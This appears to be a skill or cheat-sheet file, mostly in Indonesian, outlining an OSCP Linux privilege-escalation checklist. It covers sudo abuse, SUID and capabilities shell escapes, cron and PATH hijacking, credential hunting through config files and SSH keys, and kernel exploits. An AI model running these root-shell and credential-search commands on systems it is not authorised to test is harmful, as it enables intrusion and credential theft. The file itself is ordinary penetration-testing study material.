---
name: "Linux Privilege Escalation — 7 Attack Vectors"
description: "Linux privilege escalation methodology for OSCP covering sudo abuse, SUID/SGID binaries, Linux capabilities, cron jobs, credential hunting, internal ports, and kernel exploits as last resort."
tags: [linux, privilege-escalation, sudo, suid, capabilities, cron, kernel-exploit]
---

# Linux Privilege Escalation

## Enumerasi Prioritas

```
1. sudo -l                    # NOPASSWD, LD_PRELOAD, binary abuse (GTFOBins)
2. find / -perm -u=s          # SUID/SGID binaries
3. getcap -r / 2>/dev/null    # Linux capabilities
4. pspy64                     # Cron jobs & scheduled tasks
5. grep -r "password" /       # Credential hunting
6. netstat -antup             # Internal listening ports
7. Kernel exploit             # LAST RESORT
```

Kernel exploit adalah LAST RESORT. Jangan gunakan sebelum semua pattern di atas habis.

## Vector 1 — Sudo Abuse

```bash
sudo -l
# Cek GTFOBins untuk shell escape
# Jika LD_PRELOAD di env_keep → kompilasi shared library
```

Checklist:
- Binary dengan NOPASSWD? Cek GTFOBins untuk shell escape
- Binary bisa membaca/menulis file? `/etc/shadow`, `/etc/sudoers`?
- `env_keep+=LD_PRELOAD`? Kompilasi .so yang spawn root shell.

## Vector 2 — SUID/SGID

```bash
find / -perm -u=s -type f 2>/dev/null
```

Cari anomalies (ignore standard: ping, su, mount, passwd):
- `/usr/bin/find` → `find . -exec /bin/sh -p \;`
- `/usr/bin/systemctl` → instant root
- Custom binary di `/opt/`

## Vector 3 — Capabilities

```bash
getcap -r / 2>/dev/null
```

- `cap_setuid+ep` on Python → `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
- `cap_dac_override` → bisa baca file restricted

## Vector 4 — Cron Jobs

```bash
# Upload pspy64 untuk monitor processes
./pspy64
```

Cari:
- Script berjalan sebagai root tiap X menit
- Script di writable path → replace
- Relative path → PATH hijacking

## Vector 5 — Credential Hunting

```bash
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASS" /var/www/ 2>/dev/null
cat /var/www/html/wp-config.php
find / -name id_rsa 2>/dev/null
```

## Vector 6 — Internal Ports

```bash
netstat -antup | grep LISTEN
```

Service di localhost (127.0.0.1) yang jalan sebagai root: MySQL, Redis, Jenkins.

## Vector 7 — Kernel Exploit (LAST RESORT)

```bash
uname -r
searchsploit kernel_version
```

## Best Practices

- Jalankan enumerasi otomatis (LinPEAS) + manual checks
- Cek sudo -l SEBELUM upload tools
- Kernel exploit hanya jika semua vector lain gagal
- Backup current state sebelum execute kernel exploit
